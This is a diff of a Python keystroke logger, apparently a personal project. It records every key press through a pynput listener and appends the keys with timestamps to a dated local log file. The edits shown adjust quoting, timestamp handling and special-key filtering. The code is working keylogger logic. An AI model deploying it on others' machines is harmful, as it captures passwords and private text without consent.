@@ -15,7 +15,7 @@ def write_to_file(key):
     # letter = letter.replace("'", " ")
 
     # replaces the double quotes with a blank.
-    letter = letter.replace("'", "")
+    letter = letter.replace("'", '')
 
     # if key is pressed, then replace it with nothing. So it wont show up in the logs.
 
@@ -31,7 +31,7 @@ def write_to_file(key):
         letter = ""
 
     if letter == "Key.enter":
-        letter = "\n"
+        letter = "\n" + datetimestamp
 
     if letter == 'Key.backspace':
         letter = ''
@@ -48,8 +48,8 @@ def write_to_file(key):
     if letter == "Key.alt_r":
         letter = ''
 
-    if letter == 'Key.backspace':
-        letter = ''
+    # if letter == 'Key.backspace':
+        # letter = ''
 
     if letter == 'Key.caps_lock':
         letter = ''
@@ -132,12 +132,16 @@ def write_to_file(key):
     if letter == 'Key.insert':
         letter = ''
 
-    if datetimestamp in open(datelogname + "log.txt").read():
-        # print("Datetimestamp is in the file")
-        datetimestamp = ''
+
+    # open(datelogname + "log.txt")
+
 
     with open(datelogname + "log.txt", 'a') as f:
-        f.write(datetimestamp + " " + letter)  # writes to the file with the quoted text to the file
+      if datetimestamp in open(datelogname + "log.txt").read():
+        datetimestamp = ''
+        f.write(letter)
+      else:
+        f.write("\n " + datetimestamp + " " + letter)  # writes to the file with the quoted text to the file
 
 
 with Listener(on_press=write_to_file) as l:  # listener is basically L in this case. This will run when you press a key.
